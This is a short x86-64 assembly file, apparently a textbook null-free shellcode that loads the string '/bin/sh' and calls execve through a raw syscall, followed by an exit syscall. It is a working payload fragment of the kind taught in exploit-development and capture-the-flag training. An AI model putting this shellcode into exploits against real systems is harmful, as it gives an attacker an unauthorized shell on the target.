.globl _start  		

.section .text

_start:

  	xor %rdi,%rdi     
    push %rdi        
    push %rdi        
    pop %rsi         
    pop %rdx         
    
    # Move hexcode of /bin/sh to rdi
    movq $0x68732f6e69622f2f, %rdi 
    
    # Shift right to append '\0'
    shr $0x08,%rdi    
    push %rdi        
    push %rsp       
    pop %rdi         
   
    # push system call 59 - execve
    push $0x3b       
    pop %rax          
    syscall         
    
    movq $0x3c,%rax
    syscall 
